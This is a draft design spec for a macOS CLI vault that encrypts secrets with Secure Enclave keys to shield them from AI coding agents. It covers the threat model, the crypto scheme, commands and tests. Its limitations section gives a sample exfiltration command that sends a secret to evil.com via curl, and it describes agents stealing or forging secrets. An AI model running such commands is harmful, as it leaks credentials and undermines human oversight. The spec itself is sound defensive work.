---
title: "keypo-signer vault: Secure Enclave Secret Management Spec"
owner: @davidblumenfeld
last_verified: 2026-03-10
status: draft
---

# keypo-signer vault: Technical Specification

## Product Overview

`keypo-signer vault` extends keypo-signer with encrypted secret storage backed by the Apple Secure Enclave. It solves a specific problem: AI coding agents (Claude Code, Codex, etc.) run as your user and can read `.env` files, environment variables, and process memory. There is no access control layer between the agent and your secrets.

The vault stores secrets encrypted at rest using Secure Enclave-backed keys. Decrypting a secret requires an access control prompt (Touch ID, device passcode, or none) that corresponds to the vault's policy tier. The agent can request secrets, but for `biometric` and `passcode` vaults, a human must physically approve each operation.

The primary use case is the `vault exec` command, which decrypts secrets and injects them as environment variables into a child process. The agent constructs the command, the human approves (if required by policy), and the secrets exist only in the child process's environment. The agent's own process never holds the plaintext values.

### Multi-Vault Model

Three vaults are created during initialization, one per access control policy:

| Vault | Policy | SE Key Gate | Use Case |
|-------|--------|-------------|----------|
| `biometric` | Touch ID | Every SE key operation | Production secrets, API keys with financial exposure |
| `passcode` | Device passcode | Every SE key operation | Secrets that need protection but where Touch ID hardware isn't available |
| `open` | None (device unlocked) | None | Development tokens, test RPC URLs, non-sensitive config |

Each vault has its own Secure Enclave KeyAgreement key, its own HMAC integrity envelope, and its own set of secrets. Secret names must be globally unique across all vaults. When reading a secret, the CLI searches across all vaults automatically.

This design lets a developer store `DEPLOYER_PRIVATE_KEY` in the `biometric` vault and `BASE_SEPOLIA_RPC_URL` in the `open` vault. An agent running `vault exec` decrypts both in a single invocation, but the biometric secret triggers Touch ID while the open secret passes through silently.

---

## Architecture

### Threat Model

The adversary is an AI coding agent running with the user's shell permissions. It can:

- Read any file the user can read (`~/.env`, `~/.keypo/config.toml`, `~/.keypo/vault.json`, etc.)
- Read environment variables from its own process and any parent process via `/proc`
- Execute arbitrary shell commands
- Inspect stdout/stderr of subprocesses it launches
- Write to any file the user can write (including `vault.json`)

It cannot:

- Provide biometric authentication (Touch ID)
- Enter the macOS device passcode through the system GUI
- Bypass Secure Enclave access control policies
- Derive the HMAC key without loading the SE private key (which triggers the policy gate)

The vault's security boundary is the Secure Enclave's access control enforcement combined with HMAC integrity verification. For `biometric` and `passcode` vaults, the SE key load is the chokepoint where human approval is required. The HMAC ensures that any direct file tampering (bypassing the CLI) is detected.

### What This Does NOT Protect Against

- An agent that constructs a malicious child process command (e.g., `vault exec --allow SECRET -- curl https://evil.com -H "x: $SECRET"`). The access control prompt authorizes decryption, not the specific command. Mitigation: the `vault exec` command displays the full command string in the system prompt via `LAContext.localizedReason`.
- An agent that captures stdout of `vault get` and writes it to a file or sends it over the network. Mitigation: prefer `vault exec` over `vault get` in agent workflows.
- An agent operating against the `open` vault. With `open` policy, the SE key loads without any prompt, and the agent can derive the HMAC key. This means the agent can decrypt, update, delete, and even forge valid vault state for secrets in the `open` vault. This is by design. Use `biometric` or `passcode` for any secrets that need protection from agents.

### Encryption Scheme: ECIES with Secure Enclave

The Secure Enclave supports P-256 KeyAgreement (ECDH) in addition to P-256 Signing. The vault uses ECIES (Elliptic Curve Integrated Encryption Scheme) built on top of this:

**Key setup (once per vault, during `vault init`):**

1. Create a `SecureEnclave.P256.KeyAgreement.PrivateKey` with the chosen access control policy.
2. Store the key's `dataRepresentation` (opaque SE reference) in vault metadata.
3. Generate a fixed "integrity" ephemeral P-256 KeyAgreement keypair in software.
4. ECDH: `integrityEphemeralPrivate * SE_publicKey` = integrity shared secret.
5. HKDF-SHA256 with info `"keypo-vault-integrity-v1"` = HMAC key.
6. Discard the integrity ephemeral private key.
7. Store the integrity ephemeral public key in vault metadata.
8. Compute HMAC-SHA256 over the canonical serialization of the (empty) secrets object.
9. The SE private key never leaves the hardware.

**Encryption (per secret, during `vault set`):**

1. Load the SE private key. **This triggers the vault's access control policy.**
2. Generate an ephemeral P-256 KeyAgreement keypair in software (not SE).
3. Perform ECDH: `ephemeralPrivate * SE_publicKey` = shared secret.
4. Derive a 256-bit symmetric key via HKDF-SHA256 with info `"keypo-vault-v1" || secret_name`.
5. Encrypt the secret value with AES-256-GCM using the derived key and a random 12-byte nonce.
6. Store: `{ ephemeral_public_key, nonce, ciphertext, tag }`.
7. Recompute the vault's HMAC over the updated secrets state.
8. Zeroize and discard the ephemeral private key, derived symmetric key, and HMAC key.

**Decryption (per secret, during `vault get` / `vault exec`):**

1. Load the SE private key. **This triggers the vault's access control policy.**
2. Derive the HMAC key: ECDH with `integrityEphemeralPublicKey`, then HKDF.
3. Verify the HMAC over the current secrets state. If it fails, error: "vault integrity check failed."
4. Load the stored ephemeral public key for the requested secret.
5. Perform ECDH: `SE_private * ephemeralPublic` = shared secret.
6. Derive the symmetric key via HKDF-SHA256 with info `"keypo-vault-v1" || secret_name`.
7. Decrypt the ciphertext with AES-256-GCM.
8. Return the plaintext. Zeroize the derived keys.

### HMAC Integrity Envelope

Each vault has an HMAC-SHA256 computed over its secrets. The HMAC key is derived via ECDH between a stored ephemeral public key and the vault's SE private key. This means:

- **Producing a valid HMAC requires the SE private key**, which is gated by the vault's access control policy. For `biometric`/`passcode` vaults, an agent cannot forge a valid HMAC without human approval.
- **Every read verifies the HMAC** before trusting vault contents. If `vault.json` has been tampered with (directly edited, partially corrupted, or maliciously modified), the HMAC check fails and the vault refuses to operate.
- **Every mutation recomputes the HMAC** after modifying the secrets. This includes `vault set`, `vault update`, `vault delete`, and `vault import`.

The canonical serialization for HMAC computation is the JSON-encoded `secrets` object with keys sorted alphabetically. This ensures the HMAC is deterministic regardless of insertion order.

**Important:** The `open` vault's HMAC provides integrity against accidental corruption but NOT against a malicious agent. An agent can load the `open` SE key without a prompt, derive the HMAC key, and produce a valid HMAC for arbitrary vault content. This is an inherent property of the `open` policy and is documented explicitly.

### Secret Name Lookup

When a command needs to find a secret by name (`vault get`, `vault update`, `vault delete`, `vault exec`), the CLI searches by reading the `secrets` keys in each vault's JSON entry. This is a plain JSON lookup against `vault.json` on disk. No SE key is loaded, no access control prompt is triggered, and no HMAC is verified during the search.

The SE key loads only after the search identifies which vault the secret belongs to. If `DEPLOYER_PRIVATE_KEY` lives in the `biometric` vault, only the `biometric` SE key is loaded (one Touch ID prompt). The `passcode` and `open` vaults are never touched.

For `vault exec` with secrets spanning multiple vaults, the CLI groups secrets by vault first (JSON lookup, no prompts), then loads only the vaults that have requested secrets, in order: `open` (no prompt), `passcode`, `biometric`.

### CryptoKit Implementation

All cryptographic operations use Apple CryptoKit:

| Operation | CryptoKit API |
|-----------|---------------|
| SE key creation | `SecureEnclave.P256.KeyAgreement.PrivateKey(accessControl:)` |
| Ephemeral keypair | `P256.KeyAgreement.PrivateKey()` |
| ECDH | `sePrivateKey.sharedSecretFromKeyAgreement(with: ephemeralPublicKey)` |
| Key derivation | `sharedSecret.hkdfDerivedSymmetricKey(using: SHA256, salt: [], sharedInfo: info, outputByteCount: 32)` |
| Encryption | `AES.GCM.seal(plaintext, using: symmetricKey)` |
| Decryption | `AES.GCM.open(sealedBox, using: symmetricKey)` |
| HMAC | `HMAC<SHA256>.authenticationCode(for: data, using: hmacKey)` |
| HMAC verify | `HMAC<SHA256>.isValidAuthenticationCode(code, authenticating: data, using: hmacKey)` |

No external dependencies. CryptoKit ships with macOS.

### Storage Layout

All vault data is stored in a single file alongside existing keypo-signer data:

```
~/.keypo/
├── keys.json              # existing signing key metadata
└── vault.json             # all vaults, metadata, and encrypted secrets
```

**`vault.json`** structure:

```json
{
  "version": 2,
  "vaults": {
    "biometric": {
      "vaultKeyId": "com.keypo.vault.biometric",
      "dataRepresentation": "<base64-encoded SE key reference>",
      "publicKey": "0x04...",
      "integrityEphemeralPublicKey": "0x04...",
      "integrityHmac": "<base64, 32 bytes>",
      "createdAt": "2026-03-10T12:00:00Z",
      "secrets": {
        "DEPLOYER_PRIVATE_KEY": {
          "ephemeralPublicKey": "0x04...",
          "nonce": "<base64, 12 bytes>",
          "ciphertext": "<base64>",
          "tag": "<base64, 16 bytes>",
          "createdAt": "2026-03-10T12:05:00Z",
          "updatedAt": "2026-03-10T12:05:00Z"
        }
      }
    },
    "passcode": {
      "vaultKeyId": "com.keypo.vault.passcode",
      "dataRepresentation": "<base64>",
      "publicKey": "0x04...",
      "integrityEphemeralPublicKey": "0x04...",
      "integrityHmac": "<base64, 32 bytes>",
      "createdAt": "2026-03-10T12:00:00Z",
      "secrets": {}
    },
    "open": {
      "vaultKeyId": "com.keypo.vault.open",
      "dataRepresentation": "<base64>",
      "publicKey": "0x04...",
      "integrityEphemeralPublicKey": "0x04...",
      "integrityHmac": "<base64, 32 bytes>",
      "createdAt": "2026-03-10T12:00:00Z",
      "secrets": {
        "BASE_SEPOLIA_RPC_URL": {
          "ephemeralPublicKey": "0x04...",
          "nonce": "<base64, 12 bytes>",
          "ciphertext": "<base64>",
          "tag": "<base64, 16 bytes>",
          "createdAt": "2026-03-10T12:06:00Z",
          "updatedAt": "2026-03-10T12:06:00Z"
        }
      }
    }
  }
}
```

The `vaults` object always has exactly three entries (`biometric`, `passcode`, `open`) after initialization. Each vault is self-contained with its own SE key reference, integrity HMAC, and secrets. The HMAC for each vault covers only that vault's `secrets` object.

File permissions: `vault.json` at 600 (owner read/write only). Writes use the same atomic pattern as `keys.json`: write to a temp file in `~/.keypo/`, then `rename(2)` to `vault.json`.

### Secret Name Validation

Secret names follow environment variable conventions:

- Pattern: `^[A-Za-z_][A-Za-z0-9_]{0,127}$`
- Must start with a letter or underscore
- Alphanumeric and underscores only
- Max length: 128 characters
- **Must be globally unique across all vaults.** If `PIMLICO_API_KEY` exists in the `biometric` vault, it cannot also exist in the `open` vault. The CLI enforces this on every `vault set`.

---

## CLI Interface

All vault commands are subcommands of `keypo-signer vault`. They inherit the existing global flags (`--format`, `--quiet`, `--config`).

---

### `keypo-signer vault init`

Initialize the vault by creating all three Secure Enclave KeyAgreement keys and integrity envelopes.

**Arguments:** None required.

**Behavior:**

1. Check if `vault.json` already exists. If so, error with "vault already initialized."
2. Validate Secure Enclave availability.
3. For each policy (`open`, `passcode`, `biometric`) in that order:
   a. Create access control flags based on policy.
   b. Generate a `SecureEnclave.P256.KeyAgreement.PrivateKey` with the access control.
   c. Extract the public key and `dataRepresentation`.
   d. Generate the integrity ephemeral keypair (software P-256 KeyAgreement).
   e. ECDH: `integrityEphemeralPrivate * SE_publicKey` = integrity shared secret. **This triggers the vault's access control policy.**
   f. HKDF with info `"keypo-vault-integrity-v1"` = HMAC key.
   g. Compute initial HMAC over empty `secrets` object (`{}`).
   h. Discard the integrity ephemeral private key and HMAC key.
4. Write all three vault entries to `vault.json` atomically.
5. Output confirmation.

**JSON output:**

```json
{
  "vaults": [
    { "vaultKeyId": "com.keypo.vault.open", "policy": "open" },
    { "vaultKeyId": "com.keypo.vault.passcode", "policy": "passcode" },
    { "vaultKeyId": "com.keypo.vault.biometric", "policy": "biometric" }
  ],
  "createdAt": "2026-03-10T12:00:00Z"
}
```

**Exit codes:**

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Vault already initialized |
| 2 | Secure Enclave not available |
| 3 | Key creation failed |
| 4 | User cancelled authentication |

**Notes:**

- Creates all three vaults in a single invocation. The `open` vault is created first (no prompt), then `passcode` (device passcode dialog), then `biometric` (Touch ID). The user sees at most two prompts.
- If authentication is cancelled partway through (e.g., user cancels the passcode dialog), no vault.json is written. Init is all-or-nothing.
- **`open` vault warning:** The `open` vault provides no protection against AI agents. An agent can decrypt, update, delete, and forge valid HMAC state for all secrets in the `open` vault without human approval. Use only for non-sensitive development configuration.

---

### `keypo-signer vault set <n>`

Store an encrypted secret in a vault.

**Arguments:**

| Argument | Required | Description |
|----------|----------|-------------|
| `<n>` | Yes | Secret name (positional). Must match `^[A-Za-z_][A-Za-z0-9_]{0,127}$`. |
| `--vault <policy>` | No | Which vault to store in. Default: `biometric`. |
| `--stdin` | No | Read secret value from stdin instead of interactive prompt. |

**Behavior:**

1. Validate that vault.json exists and contains all three vaults.
2. Validate the secret name.
3. Check that the secret name does not exist in ANY vault (global uniqueness). If it does, error.
4. Read the secret value from `--stdin` or interactive prompt (value not echoed to terminal).
5. Load the target vault's SE private key. **This triggers that vault's access control policy.**
6. Derive the HMAC key (ECDH with integrity ephemeral public key, then HKDF).
7. Verify the existing HMAC. If it fails, error: "vault integrity check failed."
8. Generate an ephemeral `P256.KeyAgreement.PrivateKey` (software, not SE).
9. Perform ECDH: `ephemeralPrivate * SE_publicKey` and derive symmetric key.
10. Encrypt the value with AES-256-GCM (random 12-byte nonce).
11. Add the secret entry to the vault's secrets in `vault.json`.
12. Recompute the vault's HMAC over the updated secrets state.
13. Write `vault.json` atomically.
14. Zeroize all derived keys.
15. Output confirmation.

**JSON output:**

```json
{
  "name": "PIMLICO_API_KEY",
  "vault": "biometric",
  "action": "created",
  "createdAt": "2026-03-10T12:05:00Z"
}
```

**Exit codes:**

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Vault not initialized |
| 2 | Invalid secret name |
| 3 | Secret already exists in a vault (use `vault update`) |
| 4 | Encryption or HMAC computation failed |
| 5 | Empty value provided |
| 6 | Vault integrity check failed |
| 7 | User cancelled authentication |

**Notes:**

- `vault set` triggers the target vault's access control policy because the SE key is needed to verify and recompute the HMAC. This means adding a secret to a `biometric` vault requires Touch ID, while adding to the `open` vault requires no prompt.
- Interactive prompt uses `readpassphrase(3)` (or Swift equivalent) to suppress terminal echo.
- There is no `--value` flag. Passing secrets as command-line arguments exposes them in shell history and `ps` output. Use the interactive prompt or `--stdin` instead.

---

### `keypo-signer vault get <n>`

Decrypt and output a secret.

**Arguments:**

| Argument | Required | Description |
|----------|----------|-------------|
| `<n>` | Yes | Secret name (positional). |

**Behavior:**

1. Search across all vaults in `vault.json` for the secret name (JSON lookup, no SE key loaded).
2. Load the SE private key for the vault that contains the secret. **This triggers that vault's access control policy.**
3. Derive the HMAC key and verify integrity. If it fails, error.
4. Perform ECDH: `SE_private * ephemeralPublicKey` = shared secret.
5. Derive symmetric key via HKDF-SHA256 with info `"keypo-vault-v1" || name`.
6. Decrypt the ciphertext with AES-256-GCM.
7. Output the plaintext value.
8. Zeroize all derived keys.

**JSON output:**

```json
{
  "name": "PIMLICO_API_KEY",
  "vault": "biometric",
  "value": "pk_live_abc123..."
}
```

**Raw output:** The plaintext value only, with no trailing newline.

**Exit codes:**

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Vault not initialized |
| 2 | Secret not found in any vault |
| 3 | Decryption failed (corrupted data or wrong vault key) |
| 4 | User cancelled authentication |
| 5 | Vault integrity check failed |

**Notes:**

- No `--vault` flag needed. The CLI finds the secret by name across all vaults automatically.
- The access control prompt corresponds to whichever vault the secret lives in. If the secret is in the `open` vault, no prompt appears. If it's in the `biometric` vault, Touch ID appears.
- For agent workflows, prefer `vault exec` over `vault get` to avoid the agent capturing the plaintext in its own process.

---

### `keypo-signer vault update <n>`

Update an existing secret. Enforces the vault's access control policy.

**Arguments:**

| Argument | Required | Description |
|----------|----------|-------------|
| `<n>` | Yes | Secret name (positional). Must already exist in a vault. |
| `--stdin` | No | Read new secret value from stdin instead of interactive prompt. |

**Behavior:**

1. Search across all vaults for the secret name. Identify which vault it belongs to.
2. Load the vault's SE private key. **This triggers that vault's access control policy.**
3. Derive the HMAC key and verify integrity. If it fails, error.
4. Read the new secret value from `--stdin` or interactive prompt (value not echoed).
5. Generate a new ephemeral `P256.KeyAgreement.PrivateKey` (software, not SE).
6. Perform ECDH and derive a new symmetric key.
7. Encrypt the new value with AES-256-GCM (fresh nonce).
8. Replace the secret entry. Preserve `createdAt`; set `updatedAt` to now.
9. Recompute the vault's HMAC.
10. Write `vault.json` atomically.
11. Zeroize all derived keys.
12. Output confirmation.

**JSON output:**

```json
{
  "name": "PIMLICO_API_KEY",
  "vault": "biometric",
  "action": "updated",
  "updatedAt": "2026-03-10T14:00:00Z"
}
```

**Exit codes:**

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Vault not initialized |
| 2 | Secret not found in any vault (use `vault set` to create) |
| 3 | Encryption or HMAC computation failed |
| 4 | User cancelled authentication |
| 5 | Empty value provided |
| 6 | Vault integrity check failed |

**Notes:**

- No `--vault` flag needed. The CLI detects which vault the secret belongs to.
- There is no `--value` flag, for the same reason as `vault set`.
- To add a new secret, use `vault set`. To change an existing one, use `vault update`. This separation makes the agent's intent explicit and auditable.

---

### `keypo-signer vault delete <n>`

Remove an encrypted secret from its vault.

**Arguments:**

| Argument | Required | Description |
|----------|----------|-------------|
| `<n>` | Yes | Secret name (positional). |
| `--confirm` | Yes | Safety flag. Deletion is permanent and irreversible. |

**Behavior:**

1. Search across all vaults for the secret name. Identify which vault it belongs to.
2. Require `--confirm` flag.
3. Load the vault's SE private key. **This triggers that vault's access control policy.**
4. Derive the HMAC key and verify integrity. If it fails, error.
5. Remove the secret entry from the vault's secrets.
6. Recompute the vault's HMAC.
7. Write `vault.json` atomically.
8. Output confirmation.

**JSON output:**

```json
{
  "name": "PIMLICO_API_KEY",
  "vault": "biometric",
  "deleted": true,
  "deletedAt": "2026-03-10T16:00:00Z"
}
```

**Exit codes:**

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Vault not initialized |
| 2 | Secret not found in any vault |
| 3 | `--confirm` flag missing |
| 4 | User cancelled authentication |
| 5 | Vault integrity check failed |

---

### `keypo-signer vault list`

List all vaults and their secrets (names only, no decryption).

**Arguments:** None required.

**Behavior:**

1. Read `vault.json`. If it doesn't exist, output empty list.
2. For each vault, extract secret names and metadata without decrypting.
3. Output the list.

Note: `vault list` does NOT load the SE key and does NOT verify the HMAC. It reads metadata only. This means the output could be stale or tampered; the HMAC is verified on actual read/write operations.

**JSON output:**

```json
{
  "vaults": [
    {
      "policy": "biometric",
      "vaultKeyId": "com.keypo.vault.biometric",
      "createdAt": "2026-03-10T12:00:00Z",
      "secrets": [
        {
          "name": "DEPLOYER_PRIVATE_KEY",
          "createdAt": "2026-03-10T12:05:00Z",
          "updatedAt": "2026-03-10T12:05:00Z"
        }
      ],
      "secretCount": 1
    },
    {
      "policy": "passcode",
      "vaultKeyId": "com.keypo.vault.passcode",
      "createdAt": "2026-03-10T12:00:00Z",
      "secrets": [],
      "secretCount": 0
    },
    {
      "policy": "open",
      "vaultKeyId": "com.keypo.vault.open",
      "createdAt": "2026-03-10T12:00:00Z",
      "secrets": [
        {
          "name": "BASE_SEPOLIA_RPC_URL",
          "createdAt": "2026-03-10T12:06:00Z",
          "updatedAt": "2026-03-10T12:06:00Z"
        }
      ],
      "secretCount": 1
    }
  ]
}
```

**Exit codes:** 0 always (uninitialized vault is not an error, returns empty list).

---

### `keypo-signer vault exec`

Decrypt secrets and inject them into a child process's environment.

**Arguments:**

| Argument | Required | Description |
|----------|----------|-------------|
| `--allow <names>` | No* | Comma-separated list of secret names to inject, or `*` for all secrets across all vaults. |
| `--env <file>` | No* | Path to a `.env` file. Key names are extracted (values are ignored). See "Using `.env` Files with `vault exec`" below. |
| `-- <command> [args...]` | Yes | The command to execute. Everything after `--` is passed to the child process. |

\* At least one of `--allow` or `--env` is required. Both can be used together; the secret lists are merged (union, deduplicated). If neither is provided, the command exits with an error.

**Behavior:**

1. Resolve the secret list from `--allow` and/or `--env`. Merge and deduplicate.
2. If the list contains `*`, enumerate all secret names across all vaults.
3. Look up each secret name to determine which vault it belongs to (JSON lookup, no SE key loaded). Group by vault.
4. Validate all requested secrets exist. Error if any are missing.
5. Display a summary to stderr: which secrets will be decrypted and the command that will run.
6. For each vault that has requested secrets, load the SE private key. **This triggers that vault's access control policy.** Vaults are loaded in order: `open` first (no prompt), then `passcode`, then `biometric`. The user sees at most two prompts even if secrets span all three vaults.
7. For each vault, verify the HMAC. If any vault fails integrity, error.
8. For each secret:
   a. Load the secret entry from its vault.
   b. Perform ECDH with the stored ephemeral public key.
   c. Derive symmetric key and decrypt.
   d. Store the `(name, value)` pair in memory.
9. Zeroize all derived keys.
10. Build the child process environment: inherit the current environment, overlay the decrypted secrets.
11. Spawn the child process with `Process()` (or `posix_spawn`), passing the augmented environment.
12. Forward the child's stdout and stderr to the parent's stdout and stderr.
13. Wait for the child to exit.
14. Zeroize all decrypted values in memory.
15. Exit with the child process's exit code.

**Output:**

No JSON output. The command's stdout/stderr pass through directly. A summary is printed to stderr before execution:

```
keypo-vault: decrypting 3 secrets for: cargo test
  [biometric] DEPLOYER_PRIVATE_KEY, PIMLICO_API_KEY
  [open]      BASE_SEPOLIA_RPC_URL
[Touch ID prompt appears for biometric vault]
keypo-vault: secrets injected, running command...
```

**Exit codes:**

| Code | Meaning |
|------|---------|
| (child's exit code) | Normal: exit code of the child process is forwarded |
| 126 | Vault not initialized, secrets not found, decryption failed, or integrity check failed |
| 127 | Command not found (child process failed to spawn) |
| 128 | User cancelled authentication |

**Notes:**

- The child process inherits all current environment variables plus the decrypted secrets. If a decrypted secret name collides with an existing env var, the decrypted value takes precedence.
- At most ONE access control prompt per vault per `vault exec` invocation. The SE private key is loaded once per vault and reused for all ECDH operations. If secrets span `biometric` and `open` vaults, the user sees one Touch ID prompt (for biometric); the open vault decrypts silently.
- The command string displayed in `LAContext.localizedReason` is truncated to 150 characters. If truncated, it ends with "...".
- The agent (Claude Code) never sees the secret values. They exist only in the child process's address space.

---

### `keypo-signer vault import`

Bulk-import secrets from a `.env` file.

**Arguments:**

| Argument | Required | Description |
|----------|----------|-------------|
| `<file>` | Yes | Path to a `.env` file (positional). |
| `--vault <policy>` | No | Which vault to import into. Default: `biometric`. |
| `--dry-run` | No | Show what would be imported without storing anything. |

**Behavior:**

1. Validate that vault.json exists.
2. Parse the `.env` file. Supported format: `KEY=VALUE` lines, `#` comments, blank lines ignored, `export` prefix stripped, quoted values have quotes stripped.
3. Validate all secret names.
4. If `--dry-run`, print the list of names (not values) and exit.
5. Load the target vault's SE private key. **This triggers that vault's access control policy.**
6. Verify the vault's HMAC.
7. For each entry: if the secret name already exists in ANY vault, skip it (report as "skipped"). Otherwise, encrypt and store.
8. Recompute the vault's HMAC.
9. Write `vault.json` atomically.
10. Output summary.

**JSON output:**

```json
{
  "vault": "biometric",
  "imported": [
    { "name": "PIMLICO_API_KEY", "action": "created" },
    { "name": "RPC_URL", "action": "created" }
  ],
  "skipped": [
    { "name": "DEPLOYER_KEY", "reason": "already exists" }
  ],
  "importedCount": 2,
  "skippedCount": 1
}
```

**Exit codes:**

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Vault not initialized |
| 2 | File not found or unreadable |
| 3 | Parse error (invalid line format) |
| 4 | Secret name validation failed |
| 5 | User cancelled authentication |
| 6 | Vault integrity check failed |

**Notes:**

- Import triggers the target vault's access control policy (SE key needed for HMAC).
- Secrets that already exist in any vault are skipped, not overwritten. To update an existing secret, use `vault update`. This prevents an agent from silently replacing secrets via import.
- After import, the user should delete or relocate the original `.env` file. The CLI prints a reminder: `"Reminder: delete or move the original .env file. Secrets are now in the vault."`
- The `.env` parser is intentionally simple. It does not support multi-line values or variable interpolation. Lines that don't match `KEY=VALUE` are skipped with a warning.

---

### `keypo-signer vault destroy`

Destroy all vaults, deleting all encrypted secrets and vault keys.

**Arguments:**

| Argument | Required | Description |
|----------|----------|-------------|
| `--confirm` | Yes | Safety flag. This is permanent and irreversible. |

**Behavior:**

1. Require `--confirm` flag.
2. Check that vault.json exists. If not, error.
3. For each vault (`open`, `passcode`, `biometric`) in that order:
   a. Load the SE private key. **This triggers that vault's access control policy.**
   b. Attempt to delete the SE KeyAgreement key (best-effort).
4. Delete `vault.json`.
5. Output confirmation.

**JSON output:**

```json
{
  "destroyed": true,
  "vaultsDestroyed": ["open", "passcode", "biometric"],
  "totalSecretsDeleted": 8,
  "destroyedAt": "2026-03-10T18:00:00Z"
}
```

**Exit codes:**

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Vault not initialized |
| 2 | `--confirm` flag missing |
| 3 | User cancelled authentication |

**Notes:**

- Destroys all three vaults in a single invocation. Like init, it's all-or-nothing.
- Loads SE keys in order: `open` (no prompt), `passcode`, `biometric`. The user sees at most two prompts.
- If authentication is cancelled partway through, vaults that were already processed may have had their SE keys deleted. The CLI prints a warning and removes vault.json regardless, since partial state is worse than clean state.

---

## Using `.env` Files with `vault exec`

### How It Works

`vault exec --env .env` accepts a standard `.env` file, extracts the key names (ignoring the values), and looks up those names across all vaults. The values in the `.env` file are irrelevant -- only the key names matter. This means a developer's existing `.env` file works as-is with no format changes.

Given a `.env` file:

```
PIMLICO_API_KEY=pk_live_abc123
BASE_SEPOLIA_RPC_URL=https://sepolia.base.org
DEPLOYER_PRIVATE_KEY=0xdeadbeef
```

Running `keypo-signer vault exec --env .env -- cargo test` extracts the three key names, looks up each across all vaults (they may be in different vaults with different policies), decrypts them, and injects them into the child process. The values in the `.env` file are never used.

This also works with `.env.example` files (which typically have empty or placeholder values):

```
PIMLICO_API_KEY=
BASE_SEPOLIA_RPC_URL=
DEPLOYER_PRIVATE_KEY=
```

### `.env` File Parsing Rules

- Lines matching `KEY=VALUE` have the `KEY` extracted. The `VALUE` is ignored.
- Lines matching `KEY=` (empty value) are valid. The `KEY` is extracted.
- Lines starting with `#` are comments.
- Blank lines are ignored.
- `export KEY=VALUE` is accepted; the `export` prefix is stripped.
- Lines that don't contain `=` are skipped with a warning to stderr.
- Key names must match the vault's name validation pattern: `^[A-Za-z_][A-Za-z0-9_]{0,127}$`.

### Example: keypo-wallet Project

The keypo-wallet monorepo currently uses a `.env` file at the repo root for Foundry and integration tests. The migration path:

```bash
# 1. Initialize all three vaults
keypo-signer vault init

# 2. Import secrets (all go into biometric by default)
keypo-signer vault import .env

# 3. Move non-sensitive secrets to the open vault
keypo-signer vault delete BASE_SEPOLIA_RPC_URL --confirm
keypo-signer vault set BASE_SEPOLIA_RPC_URL --vault open --stdin < <(grep BASE_SEPOLIA_RPC_URL .env | cut -d= -f2-)

# 4. Create .env.example for agent use
sed 's/=.*/=/' .env > .env.example

# 5. Delete the plaintext .env file
rm .env

# 6. Agent workflow
keypo-signer vault exec --env .env.example -- cargo test -- --ignored --test-threads=1
```

### Agent Integration Pattern

For Claude Code or similar agents, the recommended CLAUDE.md instruction is:

```
## Secrets

This project uses keypo-vault for secret management. Never read .env files directly.
To run commands that need secrets, use:

    keypo-signer vault exec --env .env.example -- <command>

The .env.example file in the repo root lists required secrets. No additional flags needed.
```

---

## Implementation Plan

Each phase includes its own testing. Testing assumes all code is wrong and must be proven correct. The `open` vault is used extensively for automated testing since it requires no human interaction. Every code path, edge case, and failure mode is tested before moving to the next phase.

### Phase 1: VaultManager (ECIES + HMAC)

`VaultManager.swift` in `KeypoCore`: ECIES encrypt/decrypt (ECDH + HKDF + AES-GCM) and HMAC integrity (compute, verify, recompute).

#### Phase 1 Tests: ECIES Encryption/Decryption (Unit, Software P-256)

| Test | Verifies |
|------|----------|
| Encrypt then decrypt roundtrip | Plaintext in = plaintext out for varying lengths (0 bytes, 1 byte, 1KB, 100KB) |
| Different secrets produce different ciphertext | Same plaintext encrypted twice produces different ciphertext (fresh ephemeral key + nonce) |
| Wrong SE key fails decryption | Ciphertext encrypted with key A cannot be decrypted with key B |
| Corrupted ciphertext fails | Flip one bit in ciphertext, verify AES-GCM returns error |
| Corrupted tag fails | Flip one bit in the authentication tag, verify AES-GCM returns error |
| Corrupted nonce fails | Modify nonce, verify decryption produces error (not wrong plaintext) |
| Wrong ephemeral public key fails | Replace ephemeral public key with a different key, verify ECDH produces wrong shared secret and decryption fails |
| HKDF info string includes secret name | Encrypt "value" under name "A", attempt decrypt with correct key but info string for name "B", verify failure |
| Empty plaintext roundtrip | Encrypt and decrypt an empty string |
| Large plaintext roundtrip | Encrypt and decrypt 1MB of random data |
| Zeroization check | After encrypt/decrypt, verify derived key buffers are zeroed (to the extent testable in Swift) |

#### Phase 1 Tests: HMAC Integrity (Unit, Software P-256)

| Test | Verifies |
|------|----------|
| HMAC roundtrip | Compute HMAC over secrets, verify with same key succeeds |
| HMAC detects added secret | Add a secret entry to the JSON, verify HMAC fails |
| HMAC detects removed secret | Remove a secret entry, verify HMAC fails |
| HMAC detects modified ciphertext | Change one byte of a secret's ciphertext, verify HMAC fails |
| HMAC detects modified metadata | Change a secret's `createdAt`, verify HMAC fails |
| HMAC detects key reordering (negative) | Reorder secrets in JSON, verify HMAC still passes (canonical serialization sorts keys) |
| Wrong HMAC key fails | Compute HMAC with key A, verify with key B fails |
| Empty secrets HMAC | Compute and verify HMAC over empty secrets object |
| HMAC after set, update, delete cycle | Full lifecycle: init (empty HMAC), set (recompute), update (recompute), delete (recompute), verify after each step |
| Canonical serialization determinism | Serialize same secrets object 100 times, verify identical output every time |
| Canonical serialization key ordering | Secrets inserted as {B, A, C}, canonical output has {A, B, C} |

### Phase 2: VaultStore + Models

`VaultStore.swift`: reads/writes `vault.json`, atomic writes, file permissions, multi-vault lookups, global name uniqueness, canonical JSON serialization. Model additions to `Models.swift`: `VaultEntry`, `EncryptedSecret`, all output structs, new `KeypoError` cases.

#### Phase 2 Tests: Vault Store (Unit)

| Test | Verifies |
|------|----------|
| Create vault.json from scratch | Init writes file with correct structure (3 vaults, all empty secrets) |
| All three vaults present | After init, biometric, passcode, and open all exist |
| Duplicate init rejected | Init when vault.json exists returns error |
| Secret global uniqueness enforced | Set "KEY" in biometric vault, attempt set "KEY" in open vault, verify error |
| Find secret across vaults | Set in open vault, find returns it without specifying vault |
| Find secret returns correct vault | Set "A" in biometric, "B" in open, verify find returns correct vault for each |
| Find nonexistent secret | Returns nil/not-found, not a crash |
| Atomic write on crash | Simulate crash during write (kill temp file), verify original vault.json unchanged |
| File permissions | Verify vault.json created with 600 permissions |
| Corrupt vault.json rejected | Malformed JSON returns parse error, not crash |
